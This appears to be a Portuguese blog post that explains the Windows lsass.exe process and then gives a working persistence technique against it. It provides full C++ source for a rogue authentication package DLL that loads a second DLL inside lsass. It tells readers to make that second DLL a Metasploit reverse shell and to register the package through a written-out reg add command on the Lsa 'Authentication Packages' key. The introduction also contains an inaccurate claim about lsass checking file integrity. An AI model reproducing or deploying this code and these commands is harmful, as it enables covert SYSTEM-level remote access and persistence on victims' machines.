---
layout: post
title: Atingindo Persistência com lsass.exe
subtitle: Explorando lsass.exe
cover-img: /assets/img/path.jpg
thumbnail-img: /assets/img/lsass.jpg
share-img: /assets/img/path.jpg
tags: [Windows, C++]
---

O Guardião dos Códigos de Segurança do Windows

Introdução:
O mundo da tecnologia é vasto e complexo, e muitas vezes nos deparamos com termos e acrônimos que podem parecer intimidantes à primeira vista. Entre esses, encontra-se o lsass.exe, um componente essencial do sistema operacional Windows. Este artigo busca esclarecer quem é o lsass.exe, sua função e a importância que desempenha na segurança dos sistemas Windows.

Corpo:

Identificação e Significado:
O lsass.exe é uma abreviação para Local Security Authority Subsystem Service, que em português pode ser traduzido como "Serviço de Subsistema de Autoridade de Segurança Local". Trata-se de um processo vital nos sistemas Windows, responsável pela autenticação de usuários e pela implementação de políticas de segurança.

Funções Primárias:
O lsass.exe é encarregado de realizar uma série de tarefas cruciais para a integridade e segurança do sistema. Entre elas, destacam-se:

Autenticação de Usuários: Este processo é responsável por verificar a identidade dos usuários que tentam acessar o sistema, utilizando credenciais como nome de usuário e senha.

Gerenciamento de Tokens: Cria e gerencia os tokens de segurança, que são utilizados para determinar as permissões e os privilégios de um usuário.

Verificação de Integridade do Sistema: O lsass.exe verifica a integridade dos arquivos de sistema durante a inicialização, prevenindo a execução de códigos maliciosos.

Implementação de Políticas de Segurança: Controla as políticas de segurança locais, como a exigência de senhas fortes e a expiração de credenciais.

Importância na Segurança do Sistema:
A função primordial do lsass.exe na autenticação e autorização de usuários é vital para a proteção do sistema contra acessos não autorizados. Ao garantir que apenas usuários autorizados tenham permissão para acessar recursos e dados sensíveis, o lsass.exe desempenha um papel crucial na defesa contra ameaças cibernéticas.

Vulnerabilidades e Medidas de Proteção:
Como qualquer componente de sistema, o lsass.exe não está imune a possíveis vulnerabilidades. Ataques direcionados a esse processo podem resultar em violações de segurança significativas. Para mitigar esses riscos, é crucial manter o sistema operacional e os softwares atualizados, além de implementar medidas de segurança adicionais, como firewalls e antivírus confiáveis.

Conclusão:

Em síntese, o lsass.exe é um componente fundamental nos sistemas operacionais Windows, desempenhando um papel vital na segurança e integridade do sistema. Ao gerenciar a autenticação de usuários e implementar políticas de segurança, o lsass.exe atua como um guardião incansável dos códigos de segurança, protegendo os sistemas contra acessos não autorizados. Portanto, compreender sua função e importância é essencial para garantir a segurança dos ambientes digitais em que confiamos para realizar nossas atividades cotidianas.

Agora vem a parte mais legal de tudo isso vamos explorar lsass,existem muitas tecnicas para explorar este proceso especifico assim como muitos outros processos mas hoje vou abordar uma tecnica se se beneficia de uma propia função interna do lsass ou seja não é bem uma vulnerabilidade....

com uma simples dll e uma chave de registro podemos persistir em lsass a ideia é usar implementa uma DLL de pacote de segurança (SSP)

este é o codigo:

~~~cpp

#include <ntstatus.h>
#define WIN32_NO_STATUS
#define SECURITY_WIN32
#include <windows.h>
#include <sspi.h>
#include <NTSecAPI.h>
#include <ntsecpkg.h>
#include <iostream>
#pragma comment(lib, "Secur32.lib")

// Função para carregar a DLL "test.dll" a partir do caminho "C:\\Windows\\System32\\"
int Go(void) {
    HMODULE hModule = LoadLibrary("c:\\Windows\\System32\\test.dll"); // carregar a sua DLL
    if (hModule == NULL) {
        std::cerr << "Erro ao carregar a DLL" << std::endl;
        return 1;
    }

    return 0;
}

// Inicializa o pacote de segurança.
NTSTATUS NTAPI SpInitialize(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters, PLSA_SECPKG_FUNCTION_TABLE FunctionTable) {
    return 0;
}

// Encerra o pacote de segurança.
NTSTATUS NTAPI SpShutDown(void) {
    return 0;
}

// Retorna informações sobre o pacote de segurança.
NTSTATUS NTAPI SpGetInfo(PSecPkgInfoW PackageInfo) {
    PackageInfo->fCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;
    PackageInfo->wVersion = 1;
    PackageInfo->wRPCID = SECPKG_ID_NONE;
    PackageInfo->cbMaxToken = 0;
    PackageInfo->Name = (SEC_WCHAR *)L"AuthPkgSSP";
    PackageInfo->Comment = (SEC_WCHAR *)L"AuthPkgSSP";

    return 0;
}

// Função chamada pelo LSA (Local Security Authority) ao carregar a DLL do pacote de segurança.
NTSTATUS LsaApInitializePackage(ULONG AuthenticationPackageId,
                                  PLSA_DISPATCH_TABLE LsaDispatchTable,
                                  PLSA_STRING Database,
                                  PLSA_STRING Confidentiality,
                                  PLSA_STRING *AuthenticationPackageName) {
    PLSA_STRING name = NULL;
    HANDLE th;

    // Lança um código em uma nova thread
    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) Go, 0, 0, 0);
    WaitForSingleObject(th, 0);

    // Copia as funções da tabela do LSA para a tabela do pacote de segurança
    DispatchTable.CreateLogonSession = LsaDispatchTable->CreateLogonSession;
    DispatchTable.DeleteLogonSession = LsaDispatchTable->DeleteLogonSession;
    DispatchTable.AddCredential = LsaDispatchTable->AddCredential;
    DispatchTable.GetCredentials = LsaDispatchTable->GetCredentials;
    DispatchTable.DeleteCredential = LsaDispatchTable->DeleteCredential;
    DispatchTable.AllocateLsaHeap = LsaDispatchTable->AllocateLsaHeap;
    DispatchTable.FreeLsaHeap = LsaDispatchTable->FreeLsaHeap;
    DispatchTable.AllocateClientBuffer = LsaDispatchTable->AllocateClientBuffer;
    DispatchTable.FreeClientBuffer = LsaDispatchTable->FreeClientBuffer;
    DispatchTable.CopyToClientBuffer = LsaDispatchTable->CopyToClientBuffer;
    DispatchTable.CopyFromClientBuffer = LsaDispatchTable->CopyFromClientBuffer;

    // Define o nome do pacote de segurança como "SubAuth"
    name = (LSA_STRING *)LsaDispatchTable->AllocateLsaHeap(sizeof *name);
    name->Buffer = (char *)LsaDispatchTable->AllocateLsaHeap(sizeof("SubAuth") + 1);
    name->Length = sizeof("SubAuth") - 1;
    name->MaximumLength = sizeof("SubAuth");
    strcpy_s(name->Buffer, sizeof("SubAuth") + 1, "SubAuth");

    // Retorna o nome do pacote de segurança
    (*AuthenticationPackageName) = name;

    return 0;
}

// Função para realizar o processo de logon do usuário.
NTSTATUS LsaApLogonUser(PLSA_CLIENT_REQUEST ClientRequest,
  SECURITY_LOGON_TYPE LogonType,
  PVOID AuthenticationInformation,
  PVOID ClientAuthenticationBase,
  ULONG AuthenticationInformationLength,
  PVOID *ProfileBuffer,
  PULONG ProfileBufferLength,
  PLUID LogonId,
  PNTSTATUS SubStatus,
  PLSA_TOKEN_INFORMATION_TYPE TokenInformationType,
  PVOID *TokenInformation,
  PLSA_UNICODE_STRING *AccountName,
  PLSA_UNICODE_STRING *AuthenticatingAuthority) {
    return 0;
}

// Função para permitir a chamada de pacotes de segurança.
NTSTATUS LsaApCallPackage(PLSA_CLIENT_REQUEST ClientRequest,
  PVOID ProtocolSubmitBuffer,
  PVOID ClientBufferBase,
  ULONG SubmitBufferLength,
  PVOID *ProtocolReturnBuffer,
  PULONG ReturnBufferLength,
  PNTSTATUS ProtocolStatus) {
    return 0;
}

// Função chamada quando o usuário faz logout do sistema.
void LsaApLogonTerminated(PLUID LogonId) {
}

// Função para permitir a chamada de pacotes de segurança não confiáveis.
NTSTATUS LsaApCallPackageUntrusted(
   PLSA_CLIENT_REQUEST ClientRequest,
   PVOID ProtocolSubmitBuffer,
   PVOID ClientBufferBase,
   ULONG SubmitBufferLength,
   PVOID *ProtocolReturnBuffer,
   PULONG ReturnBufferLength,
   PNTSTATUS ProtocolStatus) {
    return 0;
}

// Função para permitir a chamada de pacotes de segurança diretamente.
NTSTATUS LsaApCallPackagePassthrough(
  PLSA_CLIENT_REQUEST ClientRequest,
  PVOID ProtocolSubmitBuffer,
  PVOID ClientBufferBase,
  ULONG SubmitBufferLength,
  PVOID *ProtocolReturnBuffer,
  PULONG ReturnBufferLength,
  PNTSTATUS ProtocolStatus) {
    return 0;
}

// Versões estendidas das funções de logon do usuário.
NTSTATUS LsaApLogonUserEx(
  PLSA_CLIENT_REQUEST ClientRequest,
  SECURITY_LOGON_TYPE LogonType,
  PVOID AuthenticationInformation,
  PVOID ClientAuthenticationBase,
  ULONG AuthenticationInformationLength,
  PVOID *ProfileBuffer,
  PULONG ProfileBufferLength,
  PLUID LogonId,
  PNTSTATUS SubStatus,
  PLSA_TOKEN_INFORMATION_TYPE TokenInformationType,
  PVOID *TokenInformation,
  PUNICODE_STRING *AccountName,
  PUNICODE_STRING *AuthenticatingAuthority,
  PUNICODE_STRING *MachineName) {
    return 0;
}

// Versões estendidas das funções de logon do usuário (mais recentes).
NTSTATUS LsaApLogonUserEx2(
  PLSA_CLIENT_REQUEST ClientRequest,
  SECURITY_LOGON_TYPE LogonType,
  PVOID ProtocolSubmitBuffer,
  PVOID ClientBufferBase,
  ULONG SubmitBufferSize,
  PVOID *ProfileBuffer,
  PULONG ProfileBufferSize,
  PLUID LogonId,
  PNTSTATUS SubStatus,
  PLSA_TOKEN_INFORMATION_TYPE TokenInformationType,
  PVOID *TokenInformation,
  PUNICODE_STRING *AccountName,
  PUNICODE_STRING *AuthenticatingAuthority,
  PUNICODE_STRING *MachineName,
  PSECPKG_PRIMARY_CRED PrimaryCredentials,
  PSECPKG_SUPPLEMENTAL_CRED_ARRAY *SupplementalCredentials) {
    return 0;
}

// Tabela de funções do pacote de segurança
SECPKG_FUNCTION_TABLE SecurityPackageFunctionTable[] = {
    {
        LsaApInitializePackage,
        LsaApLogonUser,
        LsaApCallPackage,
        LsaApLogonTerminated,
        LsaApCallPackageUntrusted,
        LsaApCallPackagePassthrough,
        LsaApLogonUserEx,
        LsaApLogonUserEx2,
        SpInitialize,
        SpShutDown,
        (SpGetInfoFn *) SpGetInfo,
        NULL, NULL, NULL, NULL, NULL,
        NULL, NULL, NULL, NULL, NULL,
        NULL, NULL, NULL, NULL, NULL,
        NULL
    }
};

// Função de inicialização do pacote de segurança em modo LSA.
NTSTATUS NTAPI SpLsaModeInitialize(ULONG LsaVersion, PULONG PackageVersion,
                                    PSECPKG_FUNCTION_TABLE *ppTables, PULONG pcTables) {
    HANDLE th;

    // Lança um código em uma nova thread
    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) Go, 0, 0, 0);
    WaitForSingleObject(th, 0);

    // Define a versão do pacote de segurança e a tabela de funções
    *PackageVersion = SECPKG_INTERFACE_VERSION;
    *ppTables = SecurityPackageFunctionTable;
    *pcTables = 1;

    return STATUS_SUCCESS;
}

// Ponto de entrada da DLL
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

~~~

bem basicamente voce copia isso em um arquivo .cpp e compila em dll e não exe,e então joga na pasta system32. obs nomear a dll para sspap.dll.

agora a magica vamos gerar uma dll reverse shell no metasploit e então copia a dll pasta system 32 também obs : no codigo definimos a dll para test.dll entao devemos nomear esta dll para test.dll antes de colocar em system32, e o ultimo passo é executar esse comando no cmd,esse comando cria uma chave de registro.
~~~
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0"\0"sspap.dll" /f
~~~

e esse caso deseja remover:
~~~
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0" /f
~~~

e pronto basta apenas reiniciar o sistema.





